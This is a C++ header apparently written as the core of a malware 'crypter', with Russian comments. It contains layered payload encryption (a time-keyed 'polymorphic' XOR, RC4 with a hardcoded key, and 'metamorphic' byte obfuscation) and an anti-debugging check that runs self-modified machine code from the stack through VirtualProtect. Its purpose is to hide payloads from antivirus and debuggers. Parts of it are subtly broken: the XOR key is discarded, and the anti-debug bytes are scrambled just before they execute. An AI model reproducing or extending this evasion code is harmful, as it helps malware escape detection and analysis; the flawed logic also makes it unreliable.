#pragma once
#include <Windows.h>
#include <vector>
#include <random>
#include <time.h>

namespace cryptor {
    // Полиморфный XOR с динамическим ключом
    class PolyXOR {
    private:
        static BYTE GenerateKey() {
            return static_cast<BYTE>(time(nullptr) ^ __rdtsc() & 0xFF);
        }
        
    public:
        static void Encrypt(std::vector<BYTE>& data) {
            BYTE key = GenerateKey();
            for(size_t i = 0; i < data.size(); i++) {
                data[i] ^= key;
                key = data[i] + 0x3D;  // Мутация ключа
            }
        }
    };

    // RC4 шифрование
    class RC4 {
    private:
        static void KSA(BYTE* key, int len, BYTE* S) {
            int j = 0;
            for(int i = 0; i < 256; i++) S[i] = i;
            for(int i = 0; i < 256; i++) {
                j = (j + S[i] + key[i % len]) & 0xFF;
                std::swap(S[i], S[j]);
            }
        }

    public:
        static void Encrypt(std::vector<BYTE>& data, const std::vector<BYTE>& key) {
            BYTE S[256];
            KSA(const_cast<BYTE*>(key.data()), key.size(), S);
            
            int i = 0, j = 0;
            for(size_t n = 0; n < data.size(); n++) {
                i = (i + 1) & 0xFF;
                j = (j + S[i]) & 0xFF;
                std::swap(S[i], S[j]);
                data[n] ^= S[(S[i] + S[j]) & 0xFF];
            }
        }
    };

    // Метаморфная обфускация строк
    class MetamorphicString {
    private:
        static std::vector<BYTE> Transform(const std::vector<BYTE>& data) {
            std::vector<BYTE> result = data;
            for(size_t i = 0; i < result.size(); i++) {
                result[i] = ~result[i];  // NOT
                result[i] = (result[i] << 4) | (result[i] >> 4);  // ROL 4
                result[i] ^= 0xAA;  // XOR
            }
            return result;
        }

    public:
        static std::string Encrypt(const std::string& input) {
            std::vector<BYTE> data(input.begin(), input.end());
            data = Transform(data);
            return std::string(data.begin(), data.end());
        }
    };

    // Многослойное шифрование
    class MultiLayerCrypt {
    public:
        static std::vector<BYTE> Encrypt(const std::vector<BYTE>& data) {
            std::vector<BYTE> result = data;
            
            // Слой 1: PolyXOR
            PolyXOR::Encrypt(result);
            
            // Слой 2: RC4
            std::vector<BYTE> key = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };
            RC4::Encrypt(result, key);
            
            // Слой 3: Метаморфная обфускация
            std::string temp(result.begin(), result.end());
            temp = MetamorphicString::Encrypt(temp);
            result = std::vector<BYTE>(temp.begin(), temp.end());
            
            return result;
        }
    };

    // Антиотладка с мутацией кода
    class AntiDebug {
    public:
        static bool Check() {
            BYTE code[] = {
                0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,  // mov eax, fs:[0x30]
                0x8B, 0x40, 0x02,                    // mov eax, [eax+2]
                0xC3                                  // ret
            };
            
            // Мутация кода
            for(size_t i = 0; i < sizeof(code); i++) {
                code[i] ^= 0x55;
            }
            
            typedef bool (*CheckFunc)();
            DWORD oldProtect;
            VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &oldProtect);
            bool result = ((CheckFunc)code)();
            VirtualProtect(code, sizeof(code), oldProtect, &oldProtect);
            
            return result;
        }
    };
} 